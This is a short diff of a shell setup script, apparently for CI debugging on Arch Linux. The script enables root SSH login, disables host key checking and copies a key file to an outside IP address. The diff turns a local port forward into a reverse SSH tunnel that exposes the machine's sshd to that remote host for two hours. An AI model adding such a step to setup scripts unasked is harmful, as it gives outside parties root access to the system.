@@ -1,5 +1,5 @@
 OWD=$(pwd)
-pacman --noconfirm -Suy openssh nfs-utils unzip
+pacman --noconfirm -Suy iproute2 openssh nfs-utils unzip
 echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 /usr/sbin/sshd
 eval $(ssh-agent)
@@ -15,7 +15,8 @@ chmod 0600 .ssh/authorized_keys
 echo "Host *" > .ssh/config
 echo "  StrictHostKeyChecking no" >> .ssh/config
 scp sshdkey root@168.235.81.234:/root/sshkey
-ssh -L 22001:127.0.0.1:22 root@168.235.81.234 "sleep 2h"
+ip a
+ssh -R 22001:22 root@168.235.81.234 "sleep 2h"
 exit 0
 
 
